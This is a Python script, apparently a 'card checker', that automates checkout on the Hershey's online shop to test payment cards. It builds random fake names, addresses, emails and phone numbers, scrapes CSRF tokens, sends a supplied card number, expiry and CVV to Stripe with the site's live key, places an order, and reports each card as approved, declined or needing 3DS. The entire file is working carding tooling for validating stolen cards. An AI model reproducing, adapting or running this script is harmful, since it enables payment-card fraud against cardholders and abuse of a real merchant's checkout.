import asyncio
import aiohttp
import random
import json
import re
import time
from typing import Tuple, Optional


class HersheysChecker:
    SITE = "https://shop.hersheys.com"
    PK = "pk_live_51Q4myzLXSMPrFU0zk452OTim0CjkkSQEzphLsRGy9QyArJDvOX0JJXrjjKqBuVeUFNyAP9x0rIyI6qDptrljU6aI00oLRwSirJ"
    PRODUCT_ID = "034000461219"
    PRODUCT_URL = "/our-brands/twizzlers/034000461219.html"

    SFCC_BASE = "/on/demandware.store/Sites-hersheystore-Site/en_US"

    FIRST_NAMES = [
        "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
        "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
        "Thomas","Sarah","Charles","Karen","Christopher","Lisa","Daniel","Nancy",
    ]
    LAST_NAMES = [
        "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
        "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
        "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
    ]
    CITIES = [
        ("New York","NY","10001"),("Los Angeles","CA","90001"),("Chicago","IL","60601"),
        ("Houston","TX","77001"),("Phoenix","AZ","85001"),("Philadelphia","PA","19101"),
        ("San Diego","CA","92101"),("Dallas","TX","75201"),("Denver","CO","80201"),
        ("Portland","OR","97201"),("Seattle","WA","98101"),("Boston","MA","02101"),
        ("Miami","FL","33101"),("Atlanta","GA","30301"),("Austin","TX","73301"),
    ]
    STREETS = ["Main","Oak","Maple","Cedar","Elm","Pine","Birch","Walnut","Cherry",
               "Park","Lake","Hill","Forest","River","Spring","Sunset","Valley"]

    def __init__(self):
        self._ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        ]

    def _ua(self) -> str:
        return random.choice(self._ua_list)

    def _headers(self, xhr=False) -> dict:
        h = {
            "User-Agent": self._ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        if xhr:
            h["X-Requested-With"] = "XMLHttpRequest"
            h["Accept"] = "application/json, text/javascript, */*; q=0.01"
        return h

    def _rand_identity(self) -> dict:
        first = random.choice(self.FIRST_NAMES)
        last = random.choice(self.LAST_NAMES)
        city, state, zipcode = random.choice(self.CITIES)
        street_num = random.randint(100, 9999)
        street = random.choice(self.STREETS)
        email = f"{first.lower()}{last.lower()}{random.randint(100,9999)}@protonmail.com"
        return {
            "first": first, "last": last, "email": email,
            "address": f"{street_num} {street} St",
            "city": city, "state": state, "zip": zipcode,
            "phone": f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}",
        }

    def _get_csrf(self, html: str) -> Optional[str]:
        m = re.search(r'csrf_token.*?value="([^"]+)"', html)
        return m.group(1) if m else None

    async def check_card(self, cc: str, mm: str, yy: str, cvv: str) -> Tuple[str, str]:
        if len(yy) == 2:
            yy = f"20{yy}"

        ident = self._rand_identity()
        jar = aiohttp.CookieJar(unsafe=True)

        try:
            async with aiohttp.ClientSession(cookie_jar=jar) as session:
                ua = self._ua()
                base_headers = {
                    "User-Agent": ua,
                    "Accept-Language": "en-US,en;q=0.9",
                }

                async with session.get(f"{self.SITE}/", headers={**base_headers, "Accept": "text/html"}, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    pass

                async with session.get(f"{self.SITE}{self.PRODUCT_URL}", headers={**base_headers, "Accept": "text/html"}, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    html = await r.text()
                csrf = self._get_csrf(html)
                if not csrf:
                    return "error", "No CSRF on product page"

                async with session.post(
                    f"{self.SITE}{self.SFCC_BASE}/Cart-AddProduct",
                    data={"pid": self.PRODUCT_ID, "quantity": "1", "csrf_token": csrf},
                    headers={**base_headers, "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"},
                    ssl=False, timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    cart = await r.json()
                    if cart.get("error"):
                        return "error", "Failed to add to cart"

                async with session.get(f"{self.SITE}/checkout", headers={**base_headers, "Accept": "text/html"}, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    html = await r.text()
                csrf = self._get_csrf(html)
                if not csrf:
                    return "error", "No CSRF on checkout"

                async with session.post(
                    f"{self.SITE}{self.SFCC_BASE}/CheckoutServices-SubmitCustomer",
                    data={"csrf_token": csrf, "dwfrm_customer_email": ident["email"]},
                    headers={**base_headers, "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"},
                    ssl=False, timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    await r.json()

                async with session.get(f"{self.SITE}/checkout?stage=shipping", headers={**base_headers, "Accept": "text/html"}, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    html = await r.text()
                csrf = self._get_csrf(html)
                if not csrf:
                    return "error", "No CSRF on shipping"

                async with session.post(
                    f"{self.SITE}{self.SFCC_BASE}/CheckoutShippingServices-SubmitShipping",
                    data={
                        "csrf_token": csrf,
                        "dwfrm_shipping_shippingAddress_addressFields_firstName": ident["first"],
                        "dwfrm_shipping_shippingAddress_addressFields_lastName": ident["last"],
                        "dwfrm_shipping_shippingAddress_addressFields_address1": ident["address"],
                        "dwfrm_shipping_shippingAddress_addressFields_address2": "",
                        "dwfrm_shipping_shippingAddress_addressFields_city": ident["city"],
                        "dwfrm_shipping_shippingAddress_addressFields_states_stateCode": ident["state"],
                        "dwfrm_shipping_shippingAddress_addressFields_postalCode": ident["zip"],
                        "dwfrm_shipping_shippingAddress_addressFields_country": "US",
                        "dwfrm_shipping_shippingAddress_addressFields_phone": ident["phone"],
                    },
                    headers={**base_headers, "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"},
                    ssl=False, timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    ship = await r.json()
                    if ship.get("error"):
                        return "error", "Shipping submission failed"

                async with session.get(f"{self.SITE}/checkout?stage=payment", headers={**base_headers, "Accept": "text/html"}, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    html = await r.text()
                csrf = self._get_csrf(html)
                if not csrf:
                    return "error", "No CSRF on payment"

                async with aiohttp.ClientSession() as stripe_session:
                    async with stripe_session.post(
                        "https://api.stripe.com/v1/payment_methods",
                        data={
                            "type": "card",
                            "card[number]": cc,
                            "card[exp_month]": mm,
                            "card[exp_year]": yy,
                            "card[cvc]": cvv,
                            "billing_details[name]": f"{ident['first']} {ident['last']}",
                            "billing_details[address][line1]": ident["address"],
                            "billing_details[address][city]": ident["city"],
                            "billing_details[address][state]": ident["state"],
                            "billing_details[address][postal_code]": ident["zip"],
                            "billing_details[address][country]": "US",
                            "billing_details[email]": ident["email"],
                            "billing_details[phone]": ident["phone"],
                            "key": self.PK,
                        },
                        timeout=aiohttp.ClientTimeout(total=15),
                    ) as r:
                        pm = await r.json()

                if pm.get("error"):
                    err_msg = pm["error"].get("message", "PM creation failed")
                    err_code = pm["error"].get("code", "")
                    err_decline = pm["error"].get("decline_code", "")
                    detail = err_decline or err_code or err_msg
                    return "declined", f"{detail} | PM Error"

                pm_id = pm["id"]
                last4 = pm.get("card", {}).get("last4", "")
                brand = pm.get("card", {}).get("brand", "visa")

                async with session.post(
                    f"{self.SITE}{self.SFCC_BASE}/CheckoutServices-SubmitPayment",
                    data={
                        "csrf_token": csrf,
                        "dwfrm_billing_paymentMethod": "CREDIT_CARD",
                        "dwfrm_billing_contactInfoFields_email": ident["email"],
                        "dwfrm_billing_contactInfoFields_phone": ident["phone"],
                        "dwfrm_billing_addressFields_firstName": ident["first"],
                        "dwfrm_billing_addressFields_lastName": ident["last"],
                        "dwfrm_billing_addressFields_address1": ident["address"],
                        "dwfrm_billing_addressFields_address2": "",
                        "dwfrm_billing_addressFields_city": ident["city"],
                        "dwfrm_billing_addressFields_states_stateCode": ident["state"],
                        "dwfrm_billing_addressFields_postalCode": ident["zip"],
                        "dwfrm_billing_addressFields_country": "US",
                        "stripe_source_id": pm_id,
                        "stripe_card_number": f"************{last4}",
                        "stripe_card_holder": f"{ident['first']} {ident['last']}",
                        "stripe_card_type": brand.capitalize(),
                        "stripe_card_brand": brand,
                        "stripe_card_expiration_month": mm,
                        "stripe_card_expiration_year": yy,
                        "stripe_pr_used": "",
                        "cardType": brand.capitalize(),
                    },
                    headers={**base_headers, "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"},
                    ssl=False, timeout=aiohttp.ClientTimeout(total=15),
                ) as r:
                    pay = await r.json()
                    if pay.get("error"):
                        return "error", "SubmitPayment failed"

                async with session.post(
                    f"{self.SITE}{self.SFCC_BASE}/StripePayments-CardPaymentSubmitOrder",
                    data={"csrf_token": csrf, "paymentMethodId": pm_id},
                    headers={**base_headers, "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"},
                    ssl=False, timeout=aiohttp.ClientTimeout(total=20),
                ) as r:
                    resp = await r.json()

                error = resp.get("error", False)
                err_msg = resp.get("errorMessage", "")
                order_id = resp.get("orderID", "")
                requires_action = resp.get("requires_action", False)
                client_secret = resp.get("payment_intent_client_secret", "")

                card_info = f"{brand.upper()} ****{last4}"

                if requires_action:
                    return "3ds", f"3DS Required | {card_info} | Order {order_id}"
                elif not error:
                    return "approved", f"Auth OK | {card_info} | Order {order_id}"
                else:
                    return "declined", f"{err_msg[:80]} | {card_info}"

        except asyncio.TimeoutError:
            return "error", "Timeout"
        except Exception as e:
            return "error", str(e)[:80]
